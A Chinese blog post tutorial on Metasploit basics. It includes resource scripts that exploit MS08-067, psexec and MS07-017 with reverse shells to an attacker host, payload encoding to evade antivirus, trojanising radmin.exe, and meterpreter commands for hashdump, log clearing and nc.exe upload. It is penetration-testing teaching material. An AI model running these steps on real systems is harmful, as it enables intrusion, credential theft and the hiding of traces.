@@ -1,0 +1,1558 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="渗透测试——Mestasploit 基本使用渗透测试者的困扰 需要掌握数百个工具软件，上千个命令参数，实在记不住 新出现的漏洞 PoC&#x2F;EXP 有不同的运行环境要求，准备工作繁琐 大部分时间都在学习不同工具的使用户环境，如果能统一就好了  Metasploit 简介 目前最流行、最强大、最具扩展性的渗透测试平台软件  基于 Metasploit 进行渗透测试和漏洞分析的流程和方法  2003 年由">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试——Mestasploit基本使用">
+<meta property="og:url" content="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="渗透测试——Mestasploit 基本使用渗透测试者的困扰 需要掌握数百个工具软件，上千个命令参数，实在记不住 新出现的漏洞 PoC&#x2F;EXP 有不同的运行环境要求，准备工作繁琐 大部分时间都在学习不同工具的使用户环境，如果能统一就好了  Metasploit 简介 目前最流行、最强大、最具扩展性的渗透测试平台软件  基于 Metasploit 进行渗透测试和漏洞分析的流程和方法  2003 年由">
+<meta property="og:image" content="https://i.imgur.com/zXzemZd.png">
+<meta property="og:image" content="https://i.imgur.com/mgJH3KP.jpg">
+<meta property="og:image" content="https://i.imgur.com/rNO4Mud.png">
+<meta property="og:image" content="https://i.imgur.com/ctvHDYR.png">
+<meta property="og:image" content="https://i.imgur.com/meKMAdB.png">
+<meta property="og:image" content="https://i.imgur.com/aEu1anZ.png">
+<meta property="og:image" content="https://i.imgur.com/wEztOAj.png">
+<meta property="og:image" content="https://i.imgur.com/siajCwd.png">
+<meta property="og:image" content="https://i.imgur.com/b9G8Uq6.png">
+<meta property="og:image" content="https://i.imgur.com/lJasRoT.png">
+<meta property="article:published_time" content="2020-04-03T11:52:51.000Z">
+<meta property="article:modified_time" content="2020-04-03T12:01:57.740Z">
+<meta property="article:author" content="Shu1L">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/zXzemZd.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/"/>
+
+
+
+
+
+  <title>渗透测试——Mestasploit基本使用 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试——Mestasploit基本使用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:52:51+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul>
+<li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li>
+<li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li>
+<li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li>
+</ul>
+<h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul>
+<li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p>
+</li>
+<li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p>
+</li>
+<li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p>
+<ul>
+<li>框架继承了渗透测试标准（PETS）标准</li>
+<li>一定程度上统一了渗透测试研究的工作环境</li>
+<li>新的攻击代码可以比较容易的加入框架</li>
+</ul>
+</li>
+<li><p>开发活跃版本更新频繁</p>
+<ul>
+<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
+<li>目前分化为四个版本，社区版依然十分活跃</li>
+<li>HD More说：为 Metasploit 写书是种自虐</li>
+</ul>
+</li>
+<li><p>Metasploit 默认集成 kali linux 中</p>
+</li>
+<li><p>使用 postgresql 数据库存储数据</p>
+<ul>
+<li>早期版本需要先启动数据库再启动 msf</li>
+</ul>
+<p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p>
+</li>
+</ul>
+<p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p>
+<h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
+<li>Rex<ul>
+<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
+<li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li>
+<li>编码转换（XOR、Base64、Unicode）</li>
+</ul>
+</li>
+<li>Msf::Core<ul>
+<li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li>
+</ul>
+</li>
+<li>Msf::Base<ul>
+<li>提供友好的的 API 接口，便于模块调用的库</li>
+</ul>
+</li>
+<li>Plugin 插件<ul>
+<li>连接和调用外部扩展功能和系统</li>
+</ul>
+</li>
+<li>模块<ul>
+<li>/usr/share/metasploit-framework/modules/</li>
+</ul>
+</li>
+<li>技术功能模块（不是流程模块）<ul>
+<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
+</ul>
+</li>
+<li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul>
+<li>shellcode 或系统命令</li>
+<li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li>
+<li>Single：all-in-one</li>
+<li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li>
+<li>stages：利用 stager 建立的连接下载的后续payload</li>
+<li>stager、stages 都有多种类型，适用于不同场景</li>
+<li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li>
+</ul>
+</li>
+<li>技术功能模块（不是流程模块）<ul>
+<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
+<li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li>
+<li>Nops：提高 paylaod 稳定性及维持大小</li>
+</ul>
+</li>
+</ul>
+<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul>
+<li>使用前先升级：<strong>msfupdate</strong></li>
+<li>msfcli 使用接口，现在已经更新至 msfconsole -x</li>
+<li>msfconsole 使用接口<ul>
+<li>最流行的用户接口</li>
+<li>几乎可以使用全部 msf 功能</li>
+<li>控制台命令支持 TAB 自动补全</li>
+<li>支持外部命令的执行（系统命令等）</li>
+</ul>
+</li>
+<li>点击鼠标启动</li>
+</ul>
+<pre><code>通用选项:
+    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;
+
+数据库选项:
+    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录
+    -n, --no-database                禁用数据库支持
+    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件
+
+框架选项:
+    -c FILE                          加载指定的配置文件
+    -v, -V, --version                显示版本
+
+模块选项:
+        --defer-module-loads         除非明确询问，否则推迟模块加载
+    -m, --module-path DIRECTORY      加载一个额外的模块路径
+
+控制台选项:
+    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;
+    -H, --history-file FILE          将命令历史记录保存到指定的文件
+    -L, --real-readline              使用系统Readline库而不是RbReadline
+    -o, --output FILE                输出到指定的文件
+    -p, --plugin PLUGIN              在启动时加载插件
+    -q, --quiet                      不要在启动时显示 banner 信息
+    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）
+    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）
+    -h, --help                       显示此消息</code></pre><ul>
+<li>进入 msfconsole，查看帮助信息</li>
+</ul>
+<pre><code>root@kali:~# msfconsole
+msf &gt; help
+
+核心命令
+=============
+
+    命令            描述
+    -------       -----------
+    ?             帮助菜单
+    banner        显示一个很棒的metasploit横幅
+    cd            更改当前的工作目录
+    color         切换高亮显示颜色
+    connect       连接与主机通信
+    exit          退出退出控制台
+    get           获取特定于上下文的变量的值
+    getg          获取全局变量的值
+    grep          Grep另一个命令的输出
+    help          帮助菜单
+    history       历史显示命令历史
+    irb           进入irb脚本模式
+    load          加载一个框架插件
+    quit          退出控制台
+    route         路由通过会话路由流量
+    save          保存保存活动的数据存储
+    sessions      会话转储会话列表并显示有关会话的信息
+    set           将特定于上下文的变量设置为一个值
+    setg          将全局变量设置为一个值
+    sleep         睡眠在指定的秒数内不执行任何操作
+    spool         将控制台输出写入文件以及屏幕
+    threads       线程查看和操作后台线程
+    unload        卸载卸载框架插件
+    unset         取消设置取消设置一个或多个特定于上下文的变量
+    unsetg        取消设置取消设置一个或多个全局变量
+    version       版本显示框架和控制台库版本号
+
+
+模块命令
+===============
+
+    命令            描述
+    -------       -----------
+    advanced      高级显示一个或多个模块的高级选项
+    back          返回从当前上下文返回
+    edit          编辑使用首选编辑器编辑当前模块或文件
+    info          显示有关一个或多个模块的信息
+    loadpath      加载路径搜索并加载路径中的模块
+    options       选项显示全局选项或一个或多个模块
+    popm          将最新的模块从堆栈弹出并使其处于活动状态
+    previous      将之前加载的模块设置为当前模块
+    pushm         将活动或模块列表推入模块堆栈
+    reload_all    重新加载所有定义的模块路径中的所有模块
+    reload_lib    从指定路径加载库文件
+    search        搜索搜索模块名称和说明
+    show          显示给定类型的模块或所有模块
+    use           使用按名称选择模块
+
+
+工作命令
+============
+
+    命令            描述
+    -------       -----------
+    handler       处理程序作为作业启动负载处理程序
+    jobs          作业显示和管理作业
+    kill          杀死一份工作
+    rename_job    重命名作业
+
+
+资源脚本命令
+========================
+
+    命令            描述
+    -------       -----------
+    makerc        保存从开始到文件输入的命令
+    resource      运行存储在文件中的命令
+
+
+数据库后端命令
+=========================
+
+    命令                描述
+    -------           -----------
+    db_connect        连接到现有的数据库
+    db_disconnect     断开当前数据库实例
+    db_export         导出包含数据库内容的文件
+    db_import         导入扫描结果文件（文件类型将被自动检测）
+    db_nmap           执行nmap并自动记录输出
+    db_rebuild_cache  重建数据库存储的模块缓存
+    db_status         显示当前的数据库状态
+    hosts             列出数据库中的所有主机
+    loot              列出数据库中的所有战利品
+    notes             列出数据库中的所有注释
+    services          列出数据库中的所有服务
+    vulns             列出数据库中的所有漏洞
+    workspace         在数据库工作区之间切换
+
+
+凭证后端命令
+============================
+
+    命令            描述
+    -------       -----------
+    creds         列出数据库中的所有凭据(密码)</code></pre><ul>
+<li>msf &gt; help show</li>
+</ul>
+<pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
+[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul>
+<li>msf &gt; help search</li>
+</ul>
+<pre><code>用法: search [keywords]
+
+Keywords:
+  app       :  客户端或服务器攻击的模块
+  author    :  本作者编写的模块
+  bid       :  具有匹配的Bugtraq ID的模块
+  cve       :  具有匹配CVE ID的模块
+  edb       :  具有匹配的Exploit-DB ID的模块
+  name      :  具有匹配描述性名称的模块
+  platform  :  影响这个平台的模块
+  ref       :  具有匹配参考的模块
+  type      :  特定类型的模块（exploit，auxiliary或post）
+
+msf &gt; search ms08-067
+msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul>
+<li>模块内命令</li>
+</ul>
+<pre><code>msf &gt; search ms09_001_write
+msf &gt; use auxiliary/dos/windows/smb/ms09_001_write
+msf auxiliary(dos/windows/smb/ms09_001_write) &gt; info
+
+[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions
+msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missing
+msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advanced
+msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targets
+
+
+
+msf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit
+    用法：编辑[file / to / edit.rb]
+    使用编辑当前活动模块或本地文件。
+    如果指定了文件路径，它将在编辑后自动重新加载。
+    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。
+msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul>
+<li>数据库操作</li>
+</ul>
+<pre><code>msf &gt; help db_connect 
+    [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;
+    [*]       OR: db_connect -y [path/to/database.yml]
+    [*] Examples:
+    [*]        db_connect user@metasploit3
+    [*]        db_connect user:pass@192.168.0.2/metasploit3
+    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3
+
+msf &gt; help db_import
+    Usage: db_import &lt;filename&gt; [file2...]
+    Filenames can be globs like *.xml, or **/*.xml which will search recursively
+
+msf &gt; help db_export
+    Usage:
+    db_export -f &lt;format&gt; [filename]
+    Format can be one of: xml, pwdump</code></pre><ul>
+<li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li>
+</ul>
+<pre><code>活动的会话操作和交互。
+
+选项:
+
+    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令
+    -K        终止所有会话
+    -S &lt;opt&gt;  行搜索过滤器。
+    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令
+    -h        帮助横幅
+    -i &lt;opt&gt;  与提供的会话ID进行交互
+    -k &lt;opt&gt;  按会话ID和/或范围终止会话
+    -l        列出所有活动会话
+    -n &lt;opt&gt;  按ID命名或重命名会话
+    -q        静音模式
+    -r        重置用-i或全部给定的会话的环形缓冲区
+    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块
+    -t &lt;opt&gt;  设置响应超时（默认值：15）
+    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话
+    -v        以详细模式列出会话
+    -x        在会话表中显示扩展信息
+
+许多选项允许使用逗号和破折号指定会话范围。
+例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
+<pre><code>root@kali:~# cat ms08067.rb 
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 10.10.10.147
+set RPORT 445
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 10.10.10.131
+set LPORT 4444
+exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
+<pre><code>root@kali:~# cat psexec.rb 
+use exploit/windows/smb/psexec
+set RHOST 10.10.10.148
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 10.10.10.131
+set LPORT 4444
+set SMBUSER Administrator
+set SMBPASS 123456
+exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
+<h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
+<pre><code>root@kali:~# cat ms07017.rb 
+use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
+set URIPATH /
+set SRVHOST 0.0.0.0
+set PAYLOAD windows/shell/reverse_tcp
+set EXITFUNC thread
+set LHOST 10.10.10.131
+set LPORT 4444
+exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
+<p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p>
+<h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
+<li>用法</li>
+</ul>
+<pre><code>msf &gt; search ms08-067
+msf &gt; use payload/windows/shell/bind_tcp
+msf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcode
+msf payload(windows/shell/bind_tcp) &gt; generate -h
+    Usage: generate [options]
+    Generates a payload.
+    OPTIONS:
+        -E        强制编码。
+        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;
+        -e &lt;opt&gt;  要使用的编码器模块的名称。
+        -f &lt;opt&gt;  输出文件名（否则为stdout）
+        -h        帮助横幅。
+        -i &lt;opt&gt;  编码迭代的次数。
+        -k        保持模板可执行的功能
+        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。
+        -p &lt;opt&gt;  输出平台
+        -s &lt;opt&gt;  NOP sled length.
+        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war
+        -x &lt;opt&gt;  要使用的可执行模板
+
+msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
+<ul>
+<li>自动绕过坏字符</li>
+</ul>
+<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;
+msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul>
+<li>手动指定编码模块</li>
+</ul>
+<pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
+<ul>
+<li>注入文件</li>
+</ul>
+<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul>
+<li><p>NOP：no-operation / Next Operation （无任何操作）</p>
+<ul>
+<li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li>
+<li>增加一行 EOP</li>
+</ul>
+<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li>
+</ul>
+<h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
+<li>高级、动态、可扩展的 payload<ul>
+<li>基于 metepreter 上下文利用更多漏洞发起攻击</li>
+<li>后渗透测试阶段一站式操作界面</li>
+</ul>
+</li>
+<li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul>
+<li>注入合法系统进程并建立 stager</li>
+<li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li>
+<li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li>
+</ul>
+</li>
+<li>服务端使用 c 语言编写</li>
+<li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
+</ul>
+<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb 
+use exploit/windows/smb/ms08_067_netapi
+set payload windows/meterpreter/reverse_tcp
+set RHOST 10.10.10.147
+set LHOST 10.10.10.131
+run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
+<ul>
+<li>帮助文件</li>
+</ul>
+<pre><code>meterpreter &gt; help
+
+核心命令
+=============
+
+    命令                     描述
+    -------                   -----------
+    ?                         帮助菜单
+    background                背景当前会话
+    bgkill                    杀死一个背景meterpreter脚本
+    bglist                    列出运行后台脚本
+    bgrun                     执行一个meterpreter脚本作为后台线程
+    channel                   显示信息或控制活动频道
+    close                     关闭频道
+    disable_unicode_encoding  禁用unicode字符串的编码
+    enable_unicode_encoding   启用unicode字符串的编码
+    exit                      终止meterpreter会话
+    get_timeouts              获取当前会话超时值
+    guid                      获取会话GUID
+    help                      帮助菜单
+    info                      显示有关Post模块的信息
+    irb                       进入irb脚本模式
+    load                      加载一个或多个meterpreter扩展
+    machine_id                获取连接到会话的计算机的MSF ID
+    migrate                   将服务器迁移到另一个进程
+    pivot                     管理数据透视监听器
+    quit                      终止meterpreter会话
+    read                      从频道读取数据
+    resource                  运行存储在文件中的命令
+    run                       执行meterpreter脚本或Post模块
+    sessions                  快速切换到另一个会话
+    set_timeouts              设置当前会话超时值
+    sleep                     Force Meterpreter安静，然后重新建立会话。
+    transport                 更改当前的传输机制
+    use                       不推荐使用“加载”别名
+    uuid                      获取当前会话的UUID
+    write                     将数据写入通道
+
+
+Stdapi: 文件系统命令
+============================
+
+    命令          描述
+    -------       -----------
+    cat           将文件的内容读取到屏幕上
+    cd            更改目录
+    checksum      检索文件的校验和
+    cp            将源复制到目标
+    dir           列表文件（ls的别名）
+    download      下载文件或目录
+    edit          编辑一个文件
+    getlwd        打印本地工作目录
+    getwd         打印工作目录
+    lcd           更改本地工作目录
+    lls           列出本地文件
+    lpwd          打印本地工作目录
+    ls            列出文件
+    mkdir         建立目录
+    mv            将源移到目标
+    pwd           打印工作目录
+    rm            删除指定的文件
+    rmdir         删除目录
+    search        搜索文件
+    show_mount    列出所有安装点/逻辑驱动器
+    upload        上传文件或目录
+
+
+Stdapi: 网络命令
+===========================
+
+    命令          描述
+    -------       -----------
+    arp           显示主机ARP缓存
+    getproxy      显示当前的代理配置
+    ifconfig      显示界面
+    ipconfig      显示界面
+    netstat       显示网络连接
+    portfwd       将本地端口转发到远程服务
+    resolve       解析目标上的一组主机名
+    route         查看和修改路由表
+
+
+Stdapi: 系统命令
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       清除事件日志
+    drop_token    放弃任何活动的模拟令牌。
+    execute       执行一个命令
+    getenv        获取一个或多个环境变量值
+    getpid        获取当前的进程标识符
+    getprivs      尝试启用当前进程可用的所有权限
+    getsid        获取运行服务器的用户的SID
+    getuid        获取服务器正在运行的用户
+    kill          终止一个过程
+    localtime     显示目标系统的本地日期和时间
+    pgrep         按名称过滤进程
+    pkill         按名称终止进程
+    ps            列出运行的进程
+    reboot        重新启动远程计算机
+    reg           修改远程注册表并与之交互
+    rev2self      在远程机器上调用RevertToSelf（）
+    shell         放入系统命令外壳
+    shutdown      关闭远程计算机
+    steal_token   尝试从目标进程中盗取模拟令牌
+    suspend       暂停或恢复进程列表
+    sysinfo       获取有关远程系统的信息，例如OS
+
+
+Stdapi: 用户界面命令
+===============================
+
+    命令          描述
+    -------        -----------
+    enumdesktops   列出所有可访问的桌面和窗口工作站
+    getdesktop     获取当前meterpreter桌面
+    idletime       返回远程用户闲置的秒数
+    keyscan_dump   转储按键缓冲区
+    keyscan_start  开始捕捉击键
+    keyscan_stop   停止捕获击键
+    screenshot     获取交互式桌面的屏幕截图
+    setdesktop     更改meterpreters当前桌面
+    uictl          控制一些用户界面组件
+
+
+Stdapi: Webcam 命令
+=======================
+
+    命令          描述
+    -------        -----------
+    record_mic     从默认麦克风录制音频X秒
+    webcam_chat    开始视频聊天
+    webcam_list    列出网络摄像头
+    webcam_snap    从指定的摄像头拍摄快照
+    webcam_stream  从指定的摄像头播放视频流
+
+
+Priv: Elevate Commands
+======================
+
+    命令          描述
+    -------       -----------
+    getsystem     尝试将您的特权提升为本地系统的特权。
+
+
+Priv: 密码数据库命令
+================================
+
+    命令          描述
+    -------       -----------
+    hashdump      转储SAM数据库的内容
+
+
+Priv: Timestomp 命令
+========================
+
+    命令          描述
+    -------       -----------
+    timestomp     操纵文件MACE属性</code></pre><ul>
+<li>使用</li>
+</ul>
+<pre><code>meterpreter &gt; execute -f cmd.exe
+meterpreter &gt; ps
+meterpreter &gt; getuid
+meterpreter &gt; getpid
+meterpreter &gt; clearev   # 清除日志
+meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件
+
+meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
+msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -l
+msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1
+
+meterpreter &gt; hashdump  # 读取密码
+meterpreter &gt; run post/windows/gather/hashdump  # 读取密码
+
+meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
